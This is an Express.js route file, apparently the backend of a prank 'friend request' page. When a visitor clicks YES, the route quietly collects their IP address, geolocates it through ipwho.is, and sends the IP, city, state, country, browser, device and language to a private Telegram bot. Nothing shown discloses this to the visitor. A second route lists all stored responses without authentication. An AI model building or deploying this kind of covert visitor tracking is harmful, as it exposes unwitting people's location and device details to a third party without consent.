const express = require("express");
const axios = require("axios");

const router = express.Router();

const Response = require("../models/response");

router.post("/response", async (req, res) => {
    try {

        const {
            name,
            answer,
            userAgent,
            platform,
            language
        } = req.body;

        const response = await Response.create({
            name,
            answer
        });

       if (answer === "YES") {

    let ip =
        req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
        req.socket.remoteAddress ||
        req.ip;

    if (ip.startsWith("::ffff:")) {
        ip = ip.replace("::ffff:", "");
    }

    let country = "Unknown";
    let state = "Unknown";
    let city = "Unknown";

    try {

        // During local testing use Google's public IP.
        // After deployment, replace "8.8.8.8" with ip.
        const lookupIp = ip;

        console.log("Looking up:", lookupIp);

        const geo = await axios.get(
            `https://ipwho.is/${ip}`
        );

        console.log("Geo Response:", geo.data);

        if (geo.data.success) {
            country = geo.data.country || "Unknown";
            state = geo.data.region || "Unknown";
            city = geo.data.city || "Unknown";
        }

    } catch (err) {

        console.log("Location Error:", err.message);

    }

    const time = new Date().toLocaleString("en-IN", {
        dateStyle: "full",
        timeStyle: "medium"
    });

    const message = `
🎉 FRIEND REQUEST ACCEPTED ❤️

━━━━━━━━━━━━━━━━━━

👤 Name : ${name || "Not Provided"}

💖 Someone clicked YES

📍 Country : ${country}

🏙️ State : ${state}

🌆 City : ${city}

🌍 IP : ${ip}

💻 Device : ${platform || "Unknown"}

🌐 Browser :

${userAgent || "Unknown"}

🗣️ Language : ${language || "Unknown"}

🕒 Time :

${time}

━━━━━━━━━━━━━━━━━━

❤️ Congratulations ❤️
`;

    await axios.post(
        `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
        {
            chat_id: process.env.CHAT_ID,
            text: message
        }
    );
}

        res.status(201).json(response);

    } catch (err) {

        console.log(err.response?.data || err.message);

        res.status(500).json({
            message: err.message
        });

    }
});

router.get("/responses", async (req, res) => {

    const responses = await Response.find().sort({
        createdAt: -1
    });

    res.json(responses);

});

module.exports = router;
